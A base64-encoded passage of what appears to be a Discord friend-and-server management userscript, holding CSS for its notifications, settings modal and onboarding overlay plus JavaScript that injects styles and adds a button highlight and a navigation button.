CAgIGp1c3RpZnktY29udGVudDogY2VudGVyOwp9CgouZGZtLXByb2dyZXNzLWNvbnRhaW5lciB7CiAgICBiYWNrZ3JvdW5kOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMDUpOwogICAgYm9yZGVyLXJhZGl1czogMTBweDsKICAgIHBhZGRpbmc6IDIwcHg7CiAgICBtYXJnaW4tdG9wOiAyMHB4Owp9CgouZGZtLXByb2dyZXNzLXRleHQgewogICAgY29sb3I6ICNmZmY7CiAgICBmb250LXNpemU6IDE0cHg7CiAgICBmb250LXdlaWdodDogNjAwOwogICAgbWFyZ2luLWJvdHRvbTogMTBweDsKICAgIHRleHQtYWxpZ246IGNlbnRlcjsKfQoKLmRmbS1wcm9ncmVzcy1iYXItY29udGFpbmVyIHsKICAgIGJhY2tncm91bmQ6IHJnYmEoMCwgMCwgMCwgMC4zKTsKICAgIGJvcmRlci1yYWRpdXM6IDhweDsKICAgIGhlaWdodDogOHB4OwogICAgb3ZlcmZsb3c6IGhpZGRlbjsKICAgIG1hcmdpbi10b3A6IDhweDsKfQoKLmRmbS1wcm9ncmVzcy1iYXIgewogICAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDkwZGVnLCAjNTg2NWYyLCAjNDc1MmM0KTsKICAgIGhlaWdodDogMTAwJTsKICAgIGJvcmRlci1yYWRpdXM6IDhweDsKICAgIHRyYW5zaXRpb246IHdpZHRoIDAuM3MgZWFzZTsKfQoKI2RmbS1ub3RpZmljYXRpb24tY29udGFpbmVyIHsKICAgIHBvc2l0aW9uOiBmaXhlZDsKICAgIGJvdHRvbTogMjBweDsKICAgIHJpZ2h0OiAyMHB4OwogICAgei1pbmRleDogOTk5OTk5OTsKICAgIGRpc3BsYXk6IGZsZXg7CiAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOwogICAgZ2FwOiAxMHB4OwogICAgcG9pbnRlci1ldmVudHM6IG5vbmU7Cn0KCi5kZm0tbm90aWZpY2F0aW9uIHsKICAgIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxMzVkZWcsICMxYTFhMWEgMCUsICMwZjBmMGYgMTAwJSk7CiAgICBib3JkZXI6IDFweCBzb2xpZCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMSk7CiAgICBib3JkZXItcmFkaXVzOiAxMnB4OwogICAgcGFkZGluZzogMTRweCAxOHB4OwogICAgbWluLXdpZHRoOiAzMDBweDsKICAgIG1heC13aWR0aDogMzYwcHg7CiAgICBhbmltYXRpb246IHNsaWRlSW5SaWdodCAwLjRzIGN1YmljLWJlemllcigwLjE2LCAxLCAwLjMsIDEpOwogICAgcG9pbnRlci1ldmVudHM6IGFsbDsKICAgIGRpc3BsYXk6IGZsZXg7CiAgICBhbGlnbi1pdGVtczogY2VudGVyOwogICAgZ2FwOiAxMnB4OwogICAgcG9zaXRpb246IHJlbGF0aXZlOwogICAgb3ZlcmZsb3c6IGhpZGRlbjsKfQoKLmRmbS1ub3RpZmljYXRpb246OmJlZm9yZSB7CiAgICBjb250ZW50OiAnJzsKICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgIGxlZnQ6IDA7CiAgICB0b3A6IDA7CiAgICBoZWlnaHQ6IDEwMCU7CiAgICB3aWR0aDogNHB4OwogICAgYmFja2dyb3VuZDogdmFyKC0tbm90aWZpY2F0aW9uLWNvbG9yKTsKfQoKLmRmbS1ub3RpZmljYXRpb24ucmVtb3ZpbmcgewogICAgYW5pbWF0aW9uOiBzbGlkZU91dFJpZ2h0IDAuM3MgY3ViaWMtYmV6aWVyKDAuMTYsIDEsIDAuMywgMSkgZm9yd2FyZHM7Cn0KCi5kZm0tbm90aWZpY2F0aW9uLnN1Y2Nlc3MgewogICAgLS1ub3RpZmljYXRpb24tY29sb3I6ICM0M2I1ODE7Cn0KCi5kZm0tbm90aWZpY2F0aW9uLmVycm9yIHsKICAgIC0tbm90aWZpY2F0aW9uLWNvbG9yOiAjZWQ0MjQ1Owp9CgouZGZtLW5vdGlmaWNhdGlvbi53YXJuaW5nIHsKICAgIC0tbm90aWZpY2F0aW9uLWNvbG9yOiAjZmFhNjFhOwp9CgouZGZtLW5vdGlmaWNhdGlvbi5pbmZvIHsKICAgIC0tbm90aWZpY2F0aW9uLWNvbG9yOiAjNTg2NWYyOwp9CgouZGZtLW5vdGlmaWNhdGlvbi5mcmllbmQtcmVtb3ZlZCwgLmRmbS1ub3RpZmljYXRpb24uc2VydmVyLWxlZnQgewogICAgLS1ub3RpZmljYXRpb24tY29sb3I6ICNlZDQyNDU7CiAgICBwYWRkaW5nOiAxMnB4IDE2cHg7Cn0KCi5kZm0tbm90aWZpY2F0aW9uLWljb24gewogICAgZm9udC1zaXplOiAyMnB4OwogICAgZmxleC1zaHJpbms6IDA7CiAgICBmaWx0ZXI6IGRyb3Atc2hhZG93KDAgMCA4cHggY3VycmVudENvbG9yKTsKfQoKLmRmbS1ub3RpZmljYXRpb24uc3VjY2VzcyAuZGZtLW5vdGlmaWNhdGlvbi1pY29uIHsKICAgIGNvbG9yOiAjNDNiNTgxOwp9CgouZGZtLW5vdGlmaWNhdGlvbi5lcnJvciAuZGZtLW5vdGlmaWNhdGlvbi1pY29uIHsKICAgIGNvbG9yOiAjZWQ0MjQ1Owp9CgouZGZtLW5vdGlmaWNhdGlvbi53YXJuaW5nIC5kZm0tbm90aWZpY2F0aW9uLWljb24gewogICAgY29sb3I6ICNmYWE2MWE7Cn0KCi5kZm0tbm90aWZpY2F0aW9uLmluZm8gLmRmbS1ub3RpZmljYXRpb24taWNvbiB7CiAgICBjb2xvcjogIzU4NjVmMjsKfQoKLmRmbS1ub3RpZmljYXRpb24tY29udGVudCB7CiAgICBmbGV4OiAxOwogICAgbWluLXdpZHRoOiAwOwp9CgouZGZtLW5vdGlmaWNhdGlvbi10aXRsZSB7CiAgICBjb2xvcjogI2ZmZjsKICAgIGZvbnQtc2l6ZTogMTNweDsKICAgIGZvbnQtd2VpZ2h0OiA2MDA7CiAgICBtYXJnaW4tYm90dG9tOiA0cHg7CiAgICBsaW5lLWhlaWdodDogMS4zOwp9CgouZGZtLW5vdGlmaWNhdGlvbi1tZXNzYWdlIHsKICAgIGNvbG9yOiAjYjBiMGIwOwogICAgZm9udC1zaXplOiAxMnB4OwogICAgbGluZS1oZWlnaHQ6IDEuNDsKICAgIHdvcmQtd3JhcDogYnJlYWstd29yZDsKfQoKLmRmbS1ub3RpZmljYXRpb24tY2xvc2UgewogICAgYmFja2dyb3VuZDogcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjA1KTsKICAgIGJvcmRlcjogbm9uZTsKICAgIGNvbG9yOiAjODg4OwogICAgY3Vyc29yOiBwb2ludGVyOwogICAgcGFkZGluZzogNXB4OwogICAgYm9yZGVyLXJhZGl1czogNnB4OwogICAgdHJhbnNpdGlvbjogYWxsIDAuMnM7CiAgICBmb250LXNpemU6IDE0cHg7CiAgICB3aWR0aDogMjZweDsKICAgIGhlaWdodDogMjZweDsKICAgIGRpc3BsYXk6IGZsZXg7CiAgICBhbGlnbi1pdGVtczogY2VudGVyOwogICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7CiAgICBmbGV4LXNocmluazogMDsKfQoKLmRmbS1ub3RpZmljYXRpb24tY2xvc2U6aG92ZXIgewogICAgYmFja2dyb3VuZDogcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjEpOwogICAgY29sb3I6ICNmZmY7Cn0KCi5kZm0tZnJpZW5kLXJlbW92ZWQtY29udGVudCwgLmRmbS1zZXJ2ZXItbGVmdC1jb250ZW50IHsKICAgIGRpc3BsYXk6IGZsZXg7CiAgICBhbGlnbi1pdGVtczogY2VudGVyOwogICAgZ2FwOiAxMHB4OwogICAgd2lkdGg6IDEwMCU7Cn0KCi5kZm0tZnJpZW5kLXJlbW92ZWQtYXZhdGFyLCAuZGZtLXNlcnZlci1sZWZ0LWljb24gewogICAgd2lkdGg6IDM2cHg7CiAgICBoZWlnaHQ6IDM2cHg7CiAgICBib3JkZXItcmFkaXVzOiA1MCU7CiAgICBib3JkZXI6IDJweCBzb2xpZCByZ2JhKDIzNywgNjYsIDY5LCAwLjMpOwogICAgZmxleC1zaHJpbms6IDA7Cn0KCi5kZm0tc2VydmVyLWxlZnQtaWNvbiB7CiAgICBib3JkZXItcmFkaXVzOiA4cHg7Cn0KCi5kZm0tZnJpZW5kLXJlbW92ZWQtaW5mbywgLmRmbS1zZXJ2ZXItbGVmdC1pbmZvIHsKICAgIGZsZXg6IDE7CiAgICBtaW4td2lkdGg6IDA7Cn0KCi5kZm0tZnJpZW5kLXJlbW92ZWQtbmFtZSwgLmRmbS1zZXJ2ZXItbGVmdC1uYW1lIHsKICAgIGNvbG9yOiAjZmZmOwogICAgZm9udC1zaXplOiAxM3B4OwogICAgZm9udC13ZWlnaHQ6IDYwMDsKICAgIG1hcmdpbi1ib3R0b206IDJweDsKICAgIHdoaXRlLXNwYWNlOiBub3dyYXA7CiAgICBvdmVyZmxvdzogaGlkZGVuOwogICAgdGV4dC1vdmVyZmxvdzogZWxsaXBzaXM7Cn0KCi5kZm0tZnJpZW5kLXJlbW92ZWQtdGV4dCwgLmRmbS1zZXJ2ZXItbGVmdC10ZXh0IHsKICAgIGNvbG9yOiAjODg4OwogICAgZm9udC1zaXplOiAxMXB4Owp9CgouZGZtLXNldHRpbmdzLW1vZGFsIHsKICAgIHBvc2l0aW9uOiBmaXhlZDsKICAgIHRvcDogMDsKICAgIGxlZnQ6IDA7CiAgICB3aWR0aDogMTAwJTsKICAgIGhlaWdodDogMTAwJTsKICAgIGJhY2tncm91bmQ6IHJnYmEoMCwgMCwgMCwgMC44NSk7CiAgICBkaXNwbGF5OiBmbGV4OwogICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOwogICAgei1pbmRleDogMTAwMDAwMTsKICAgIGFuaW1hdGlvbjogZmFkZUluIDAuM3MgZWFzZS1vdXQ7CiAgICBwYWRkaW5nOiAyMHB4OwogICAgYmFja2Ryb3AtZmlsdGVyOiBibHVyKDhweCk7Cn0KCi5kZm0tc2V0dGluZ3MtY29udGVudCB7CiAgICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTQ1ZGVnLCAjMWExYTFhIDAlLCAjMGYwZjBmIDEwMCUpOwogICAgcGFkZGluZzogMzBweDsKICAgIGJvcmRlci1yYWRpdXM6IDE2cHg7CiAgICBtYXgtd2lkdGg6IDM4MHB4OwogICAgd2lkdGg6IDEwMCU7CiAgICBhbmltYXRpb246IGZhZGVJbiAwLjNzIGN1YmljLWJlemllcigwLjE2LCAxLCAwLjMsIDEpOwp9CgouZGZtLXNldHRpbmdzLXRpdGxlIHsKICAgIGNvbG9yOiAjZmZmOwogICAgZm9udC1zaXplOiAyMHB4OwogICAgZm9udC13ZWlnaHQ6IDcwMDsKICAgIG1hcmdpbi1ib3R0b206IDIwcHg7CiAgICB0ZXh0LWFsaWduOiBjZW50ZXI7Cn0KCi5kZm0tc2V0dGluZ3Mtb3B0aW9uIHsKICAgIG1hcmdpbi1ib3R0b206IDE2cHg7Cn0KCi5kZm0tc2V0dGluZ3MtbGFiZWwgewogICAgY29sb3I6ICNiMGIwYjA7CiAgICBmb250LXNpemU6IDE0cHg7CiAgICBtYXJnaW4tYm90dG9tOiA4cHg7CiAgICBkaXNwbGF5OiBibG9jazsKfQoKLmRmbS1zZXR0aW5ncy1zZWxlY3QgewogICAgd2lkdGg6IDEwMCU7CiAgICBwYWRkaW5nOiAxMHB4IDE0cHg7CiAgICBiYWNrZ3JvdW5kOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMDUpOwogICAgYm9yZGVyOiAxcHggc29saWQgcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjEpOwogICAgYm9yZGVyLXJhZGl1czogOHB4OwogICAgY29sb3I6ICNmZmY7CiAgICBmb250LXNpemU6IDE0cHg7CiAgICBhcHBlYXJhbmNlOiBub25lOwogICAgYmFja2dyb3VuZC1pbWFnZTogdXJsKCJkYXRhOmltYWdlL3N2Zyt4bWw7Y2hhcnNldD1VVEYtOCwlM2NzdmcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2aWV3Qm94PScwIDAgMjQgMjQnIGZpbGw9JyUyM2IwYjBiMCclM2UlM2NwYXRoIGQ9J003IDEwbDUgNSA1LTV6Jy8lM2UlM2Mvc3ZnJTNlIik7CiAgICBiYWNrZ3JvdW5kLXJlcGVhdDogbm8tcmVwZWF0OwogICAgYmFja2dyb3VuZC1wb3NpdGlvbjogcmlnaHQgMTRweCBjZW50ZXI7CiAgICBiYWNrZ3JvdW5kLXNpemU6IDIwcHg7CiAgICBwYWRkaW5nLXJpZ2h0OiA0MHB4Owp9CgouZGZtLXNldHRpbmdzLXNlbGVjdDpmb2N1cyB7CiAgICBvdXRsaW5lOiBub25lOwogICAgYm9yZGVyLWNvbG9yOiAjNTg2NWYyOwp9CgouZGZtLXNldHRpbmdzLXNlbGVjdCBvcHRpb24gewogICAgYmFja2dyb3VuZDogIzFhMWExYTsKICAgIGNvbG9yOiAjZmZmOwogICAgcGFkZGluZzogMTBweDsKfQoKLmRmbS1zZXR0aW5ncy1zZWxlY3Qgb3B0aW9uOmNoZWNrZWQgewogICAgYmFja2dyb3VuZDogIzU4NjVmMjsKICAgIGNvbG9yOiAjZmZmOwp9CgouZGZtLWhpZ2hsaWdodC1vdmVybGF5IHsKICAgIHBvc2l0aW9uOiBmaXhlZDsKICAgIHRvcDogMDsKICAgIGxlZnQ6IDA7CiAgICB3aWR0aDogMTAwJTsKICAgIGhlaWdodDogMTAwJTsKICAgIGJhY2tncm91bmQ6IHJnYmEoMCwgMCwgMCwgMC45NSk7CiAgICB6LWluZGV4OiAxMDAwMDAwMDsKICAgIGFuaW1hdGlvbjogc3BvdGxpZ2h0SW4gMC42cyBjdWJpYy1iZXppZXIoMC4xNiwgMSwgMC4zLCAxKSBmb3J3YXJkczsKICAgIGRpc3BsYXk6IGZsZXg7CiAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOwogICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOwogICAgY29sb3I6IHdoaXRlOwogICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgcGFkZGluZzogMjBweDsKICAgIGJhY2tkcm9wLWZpbHRlcjogYmx1cigxMHB4KTsKfQoKLmRmbS1oaWdobGlnaHQtb3ZlcmxheS5oaWRpbmcgewogICAgYW5pbWF0aW9uOiBzcG90bGlnaHRPdXQgMC41cyBjdWJpYy1iZXppZXIoMC4xNiwgMSwgMC4zLCAxKSBmb3J3YXJkczsKfQoKLmRmbS1oaWdobGlnaHQtY29udGVudCB7CiAgICBtYXgtd2lkdGg6IDUwMHB4OwogICAgcGFkZGluZzogNDBweDsKICAgIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxNDVkZWcsICMxYTFhMWEgMCUsICMwZjBmMGYgMTAwJSk7CiAgICBib3JkZXItcmFkaXVzOiAyMHB4OwogICAgYm9yZGVyOiAxcHggc29saWQgcmdiYSg4OCwgMTAxLCAyNDIsIDAuMyk7CiAgICBib3gtc2hhZG93OiAwIDIwcHggNjBweCByZ2JhKDAsIDAsIDAsIDAuNSk7CiAgICBhbmltYXRpb246IGZhZGVJbiAwLjVzIGVhc2Utb3V0IDAuM3MgYm90aDsKfQoKLmRmbS1oaWdobGlnaHQtdGl0bGUgewogICAgZm9udC1zaXplOiAyOHB4OwogICAgZm9udC13ZWlnaHQ6IDcwMDsKICAgIG1hcmdpbi1ib3R0b206IDE2cHg7CiAgICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoOTBkZWcsICM1ODY1ZjIsICM0NzUyYzQpOwogICAgLXdlYmtpdC1iYWNrZ3JvdW5kLWNsaXA6IHRleHQ7CiAgICAtd2Via2l0LXRleHQtZmlsbC1jb2xvcjogdHJhbnNwYXJlbnQ7CiAgICBiYWNrZ3JvdW5kLWNsaXA6IHRleHQ7Cn0KCi5kZm0taGlnaGxpZ2h0LW1lc3NhZ2UgewogICAgZm9udC1zaXplOiAxNnB4OwogICAgY29sb3I6ICNiMGIwYjA7CiAgICBtYXJnaW4tYm90dG9tOiAzMHB4OwogICAgbGluZS1oZWlnaHQ6IDEuNjsKfQoKLmRmbS1oaWdobGlnaHQtYnV0dG9uIHsKICAgIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxMzVkZWcsICM1ODY1ZjIgMCUsICM0NzUyYzQgMTAwJSk7CiAgICBjb2xvcjogd2hpdGU7CiAgICBib3JkZXI6IG5vbmU7CiAgICBwYWRkaW5nOiAxNHB4IDQwcHg7CiAgICBib3JkZXItcmFkaXVzOiAxMnB4OwogICAgZm9udC1zaXplOiAxNnB4OwogICAgZm9udC13ZWlnaHQ6IDYwMDsKICAgIGN1cnNvcjogcG9pbnRlcjsKICAgIHRyYW5zaXRpb246IGFsbCAwLjNzIGN1YmljLWJlemllcigwLjE2LCAxLCAwLjMsIDEpOwogICAgbWFyZ2luLXRvcDogMTBweDsKICAgIHBvc2l0aW9uOiByZWxhdGl2ZTsKICAgIG92ZXJmbG93OiBoaWRkZW47Cn0KCi5kZm0taGlnaGxpZ2h0LWJ1dHRvbjpob3ZlciB7CiAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoLTNweCk7CiAgICBib3gtc2hhZG93OiAwIDEwcHggMjVweCByZ2JhKDg4LCAxMDEsIDI0MiwgMC40KTsKfQoKLmRmbS1oaWdobGlnaHQtYnV0dG9uOmFjdGl2ZSB7CiAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoMCk7Cn0KCi5kZm0taGlnaGxpZ2h0LWJ1dHRvbjo6YmVmb3JlIHsKICAgIGNvbnRlbnQ6ICcnOwogICAgcG9zaXRpb246IGFic29sdXRlOwogICAgdG9wOiAwOwogICAgbGVmdDogLTEwMCU7CiAgICB3aWR0aDogMTAwJTsKICAgIGhlaWdodDogMTAwJTsKICAgIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCg5MGRlZywgdHJhbnNwYXJlbnQsIHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4yKSwgdHJhbnNwYXJlbnQpOwogICAgdHJhbnNpdGlvbjogbGVmdCAwLjZzOwp9CgouZGZtLWhpZ2hsaWdodC1idXR0b246aG92ZXI6OmJlZm9yZSB7CiAgICBsZWZ0OiAxMDAlOwp9CgouZGZtLWhpZ2hsaWdodC1ib3Rhby1pbmRpY2Fkb3IgewogICAgcG9zaXRpb246IGFic29sdXRlOwogICAgcG9pbnRlci1ldmVudHM6IG5vbmU7CiAgICB6LWluZGV4OiAxMDAwMDAwMTsKICAgIGFuaW1hdGlvbjogcHVsc2VIaWdobGlnaHQgMnMgaW5maW5pdGU7CiAgICBib3JkZXItcmFkaXVzOiA4cHg7CiAgICB0cmFuc2l0aW9uOiBhbGwgMC4zczsKfQoKLmRmbS1oaWdobGlnaHQtc3RlcCB7CiAgICBkaXNwbGF5OiBmbGV4OwogICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgIG1hcmdpbi1ib3R0b206IDI1cHg7CiAgICBwYWRkaW5nOiAxNXB4OwogICAgYmFja2dyb3VuZDogcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjA1KTsKICAgIGJvcmRlci1yYWRpdXM6IDEycHg7CiAgICBib3JkZXItbGVmdDogNHB4IHNvbGlkICM1ODY1ZjI7Cn0KCi5kZm0taGlnaGxpZ2h0LXN0ZXAtbnVtYmVyIHsKICAgIHdpZHRoOiAzNnB4OwogICAgaGVpZ2h0OiAzNnB4OwogICAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDEzNWRlZywgIzU4NjVmMiAwJSwgIzQ3NTJjNCAxMDAlKTsKICAgIGJvcmRlci1yYWRpdXM6IDUwJTsKICAgIGRpc3BsYXk6IGZsZXg7CiAgICBhbGlnbi1pdGVtczogY2VudGVyOwogICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7CiAgICBmb250LXdlaWdodDogNzAwOwogICAgZm9udC1zaXplOiAxNnB4OwogICAgbWFyZ2luLXJpZ2h0OiAxNXB4OwogICAgZmxleC1zaHJpbms6IDA7Cn0KCi5kZm0taGlnaGxpZ2h0LXN0ZXAtdGV4dCB7CiAgICBmb250LXNpemU6IDE0cHg7CiAgICBjb2xvcjogI2UwZTBlMDsKICAgIHRleHQtYWxpZ246IGxlZnQ7Cn0KCi5kZm0taGlnaGxpZ2h0LWZlYXR1cmVzIHsKICAgIGRpc3BsYXk6IGdyaWQ7CiAgICBncmlkLXRlbXBsYXRlLWNvbHVtbnM6IHJlcGVhdCgyLCAxZnIpOwogICAgZ2FwOiAxMnB4OwogICAgbWFyZ2luOiAyNXB4IDA7Cn0KCi5kZm0taGlnaGxpZ2h0LWZlYXR1cmUgewogICAgYmFja2dyb3VuZDogcmdiYSg4OCwgMTAxLCAyNDIsIDAuMSk7CiAgICBwYWRkaW5nOiAxMnB4OwogICAgYm9yZGVyLXJhZGl1czogMTBweDsKICAgIGZvbnQtc2l6ZTogMTJweDsKICAgIGNvbG9yOiAjYjBiMGIwOwogICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgYm9yZGVyOiAxcHggc29saWQgcmdiYSg4OCwgMTAxLCAyNDIsIDAuMik7Cn0KCkBtZWRpYSAobWF4LXdpZHRoOiA3NjhweCkgewogICAgI2Rpc2NvcmQtZnJpZW5kLW1hbmFnZXIgewogICAgICAgIHdpZHRoOiA5MiU7CiAgICAgICAgbWF4LWhlaWdodDogODV2aDsKICAgIH0KCiAgICAuZGZtLWhlYWRlciB7CiAgICAgICAgcGFkZGluZzogMTZweCAxOHB4OwogICAgfQoKICAgIC5kZm0tdGl0bGUgewogICAgICAgIGZvbnQtc2l6ZTogMTRweDsKICAgIH0KCiAgICAuZGZtLXRhYiB7CiAgICAgICAgcGFkZGluZzogMTJweCAxNnB4OwogICAgICAgIGZvbnQtc2l6ZTogMTJweDsKICAgIH0KCiAgICAuZGZtLXRhYi1jb250ZW50IHsKICAgICAgICBwYWRkaW5nOiAxOHB4OwogICAgfQoKICAgIC5kZm0tYWN0aW9ucyB7CiAgICAgICAgZ3JpZC10ZW1wbGF0ZS1jb2x1bW5zOiAxZnI7CiAgICAgICAgZ2FwOiA4cHg7CiAgICB9CgogICAgLmRmbS1mcmllbmQsIC5kZm0tc2VydmVyIHsKICAgICAgICBwYWRkaW5nOiAxMnB4IDE0cHg7CiAgICAgICAgZ2FwOiAxMHB4OwogICAgfQoKICAgIC5kZm0tYXZhdGFyLCAuZGZtLXNlcnZlci1pY29uIHsKICAgICAgICB3aWR0aDogNDBweDsKICAgICAgICBoZWlnaHQ6IDQwcHg7CiAgICB9CgogICAgLmRmbS1uYW1lIHsKICAgICAgICBmb250LXNpemU6IDEzcHg7CiAgICB9CgogICAgLmRmbS1yZW1vdmUsIC5kZm0tZGVsZXRlLW1lc3NhZ2VzLCAuZGZtLWxlYXZlLXNlcnZlciB7CiAgICAgICAgcGFkZGluZzogN3B4IDEycHg7CiAgICAgICAgZm9udC1zaXplOiAxMXB4OwogICAgfQoKICAgIC5kZi1ub3RpZmljYXRpb24gewptaW4td2lkdGg6IDI2MHB4OwptYXgtd2lkdGg6IDMyMHB4Owp9CiNkZm0tbm90aWZpY2F0aW9uLWNvbnRhaW5lciB7CiAgICBib3R0b206IDEycHg7CiAgICByaWdodDogMTJweDsKfQoKLmRmbS1oaWdobGlnaHQtY29udGVudCB7CiAgICBwYWRkaW5nOiAyNXB4OwogICAgbWFyZ2luOiAyMHB4Owp9CgouZGZtLWhpZ2hsaWdodC10aXRsZSB7CiAgICBmb250LXNpemU6IDIycHg7Cn0KCi5kZm0taGlnaGxpZ2h0LW1lc3NhZ2UgewogICAgZm9udC1zaXplOiAxNHB4Owp9CgouZGZtLWhpZ2hsaWdodC1mZWF0dXJlcyB7CiAgICBncmlkLXRlbXBsYXRlLWNvbHVtbnM6IDFmcjsKfQoKLmRmbS1oaWdobGlnaHQtc3RlcCB7CiAgICBwYWRkaW5nOiAxMnB4Owp9Cn0KYDsKICAgIGRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQoc3R5bGUpOwoKICAgIGNvbnN0IG5vdGlmaWNhdGlvbkNvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwogICAgbm90aWZpY2F0aW9uQ29udGFpbmVyLmlkID0gJ2RmbS1ub3RpZmljYXRpb24tY29udGFpbmVyJzsKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQobm90aWZpY2F0aW9uQ29udGFpbmVyKTsKCiAgICBmdW5jdGlvbiBzaG93QnV0dG9uSGlnaGxpZ2h0KGJ1dHRvbkVsZW1lbnQpIHsKICAgICAgICBjb25zdCBidXR0b25JbmRpY2F0b3IgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKICAgICAgICBidXR0b25JbmRpY2F0b3IuY2xhc3NOYW1lID0gJ2RmbS1oaWdobGlnaHQtYm90YW8taW5kaWNhZG9yJzsKCiAgICAgICAgY29uc3QgYnV0dG9uUmVjdCA9IGJ1dHRvbkVsZW1lbnQuZ2V0Qm91bmRpbmdDbGllbnRSZWN0KCk7CgogICAgICAgIGJ1dHRvbkluZGljYXRvci5zdHlsZS5jc3NUZXh0ID0gYAogICAgICAgICAgICBwb3NpdGlvbjogZml4ZWQ7CiAgICAgICAgICAgIHRvcDogJHtidXR0b25SZWN0LnRvcH1weDsKICAgICAgICAgICAgbGVmdDogJHtidXR0b25SZWN0LmxlZnR9cHg7CiAgICAgICAgICAgIHdpZHRoOiAke2J1dHRvblJlY3Qud2lkdGh9cHg7CiAgICAgICAgICAgIGhlaWdodDogJHtidXR0b25SZWN0LmhlaWdodH1weDsKICAgICAgICAgICAgYmFja2dyb3VuZDogcmdiYSg4OCwgMTAxLCAyNDIsIDAuMik7CiAgICAgICAgICAgIGJvcmRlcjogMnB4IHNvbGlkICM1ODY1ZjI7CiAgICAgICAgICAgIHBvaW50ZXItZXZlbnRzOiBub25lOwogICAgICAgICAgICB6LWluZGV4OiAxMDAwMDAwMTsKICAgICAgICBgOwoKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGJ1dHRvbkluZGljYXRvcik7CgogICAgICAgIGNvbnN0IHVwZGF0ZUluZGljYXRvclBvc2l0aW9uID0gKCkgPT4gewogICAgICAgICAgICBjb25zdCBuZXdSZWN0ID0gYnV0dG9uRWxlbWVudC5nZXRCb3VuZGluZ0NsaWVudFJlY3QoKTsKICAgICAgICAgICAgYnV0dG9uSW5kaWNhdG9yLnN0eWxlLnRvcCA9IGAke25ld1JlY3QudG9wfXB4YDsKICAgICAgICAgICAgYnV0dG9uSW5kaWNhdG9yLnN0eWxlLmxlZnQgPSBgJHtuZXdSZWN0LmxlZnR9cHhgOwogICAgICAgICAgICBidXR0b25JbmRpY2F0b3Iuc3R5bGUud2lkdGggPSBgJHtuZXdSZWN0LndpZHRofXB4YDsKICAgICAgICAgICAgYnV0dG9uSW5kaWNhdG9yLnN0eWxlLmhlaWdodCA9IGAke25ld1JlY3QuaGVpZ2h0fXB4YDsKICAgICAgICB9OwoKICAgICAgICB3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcigncmVzaXplJywgdXBkYXRlSW5kaWNhdG9yUG9zaXRpb24pOwoKICAgICAgICBzZXRUaW1lb3V0KCgpID0+IHsKICAgICAgICAgICAgYnV0dG9uSW5kaWNhdG9yLnN0eWxlLmFuaW1hdGlvbiA9ICdmYWRlT3V0IDAuNXMgY3ViaWMtYmV6aWVyKDAuMTYsIDEsIDAuMywgMSkgZm9yd2FyZHMnOwogICAgICAgICAgICBzZXRUaW1lb3V0KCgpID0+IHsKICAgICAgICAgICAgICAgIGlmIChidXR0b25JbmRpY2F0b3IucGFyZW50RWxlbWVudCkgewogICAgICAgICAgICAgICAgICAgIGJ1dHRvbkluZGljYXRvci5yZW1vdmUoKTsKICAgICAgICAgICAgICAgICAgICB3aW5kb3cucmVtb3ZlRXZlbnRMaXN0ZW5lcigncmVzaXplJywgdXBkYXRlSW5kaWNhdG9yUG9zaXRpb24pOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9LCA1MDApOwogICAgICAgIH0sIDMwMDApOwogICAgfQoKICAgIGNvbnN0IGNyZWF0ZURpc2NvcmRNYW5hZ2VyQnV0dG9uID0gKCkgPT4gewogICAgICAgIGlmIChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZGlzY29yZC1tYW5hZ2VyLW5hdi1idXR0b24nKSkgcmV0dXJuOwoKICAgICAgICBjb25zdCBtYW5hZ2VyQnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnbGknKTsKICAgICAgICBtYW5hZ2VyQnV0dG9uLmlkID0gJ2Rpc2NvcmQtbWFuYWdlci1uYXYtYnV0dG9uJzsKICAgICAgICBtYW5hZ2VyQnV0dG9uLmNsYXNzTmFtZSA9ICdfOTcyYTBkMjJjOGFmYTdmMC1jaGFubmVsIGU0NTg1OWQ2MDc5OWFkN2MtY29udGFpbmVyJzsKICAgICAgICBtYW5hZ2VyQnV0dG9uLnNldEF0dHJpYnV0ZSgncm9sZScsICdsaXN0aXRlbScpOwoKICAgICAgICBtYW5hZ2VyQnV0dG9uLmlubmVySFRNTCA9IGAKICAgICAgICAgICAgPGRpdiBjbGFzcz0iYmYyMDJkNjNhZDU